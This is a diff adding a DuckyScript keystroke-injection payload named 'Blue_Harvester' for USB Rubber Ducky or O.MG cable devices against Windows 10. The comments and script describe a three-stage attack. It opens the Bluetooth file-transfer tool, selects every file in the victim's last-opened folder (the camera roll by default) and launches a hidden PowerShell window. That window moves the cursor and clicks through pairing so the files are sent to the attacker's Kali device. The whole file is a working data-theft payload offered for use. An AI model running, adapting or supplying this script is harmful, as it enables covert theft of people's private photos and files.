@@ -1,0 +1,133 @@
+
+REM Title: Blue_Harvester
+
+REM Author: LulzAnarchyAnon
+
+
+
+
+REM READ BELOW BEFORE EXECUTING PAYLOAD...
+
+REM Description: This is a Three stage payload that begins by opening bluetooth file transfer on the target device.  
+REM Next the attackers bluetooth adapter name is selected for pairing. In the second stage the last folder opened
+REM is selected followed by all of the files in the folder being selected, and added to  the transfer cue.
+REM The Third, and final stage authticates, and allows pairing between the attacker, and the target device.
+REM Afterwards the selected files are transfered to the attackers device via bluetooth.
+REM I selected the pictures/camera roll folder as a default for this payload, but it can be changed.
+REM Depending on both devices certain varibles will need to be adjusted in order for this payload to run correctly.
+REM At the beginning of the Second stage "k" is for kali (adapter name) as it is the attacker device used for payload.
+REM NOTE: Make sure your device is Discoverable...
+REM The cursor coordinates x,y on the screen may vary depending on device...
+REM A Pairing request will pop up, hit CONFIRM... A Pairing accept will pop up, hit CONFIRM
+
+
+REM I'm uncertain at the moment if this payload is more favorable for deplotment on the OMG cables, or 
+REM USB Rubber Ducky (YOUR CHOICE)
+
+
+
+
+REM Target: Windows 10
+
+REM Props: Darren Kitchen and I am Jakoby
+
+REM Version: 1.0
+
+REM Category: Execution
+
+
+
+REM STAGE 1 
+
+GUI 
+DELAY 50
+STRING fsquirt
+DELAY 200
+ENTER
+DELAY 500
+SPACE
+DELAY 500
+
+
+
+REM STAGE 2
+
+k
+DELAY 500
+ENTER
+DELAY 500
+SPACE
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+ENTER
+DELAY 500
+CTRL a
+DELAY 500
+ENTER
+DELAY 500
+TAB
+DELAY 500
+ENTER
+
+
+
+REM STAGE 3 
+
+GUI 
+DELAY 50
+STRING powershell -windowstyle hidden
+DELAY 1000
+ENTER
+DELAY 5000
+STRING Add-Type -AssemblyName System.Windows.Forms
+DELAY 2000
+ENTER
+STRING $p1 = [System.Windows.Forms.Cursor]::Position.X = 1837
+DELAY 2000
+ENTER
+STRING $p2 = [System.Windows.Forms.Cursor]::Position.Y = 1050
+DELAY 2000
+ENTER
+DELAY 2000
+STRING [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($p1, $p2)
+DELAY 2000
+ENTER
+DELAY 500
+MOUSE CLICK 1
+DELAY 1000
+ENTER
+DELAY 1000
+TAB
+DELAY 1000
+ENTER
+DELAY 1000
+ALT SPACE
+DELAY 500
+DOWNARROW
+DELAY 500
+DOWNARROW
+DELAY 500
+DOWNARROW
+DELAY 500
+DOWNARROW
+DELAY 500
+DOWNARROW
+DELAY 500
+DOWNARROW
+DELAY 500
+ENTER
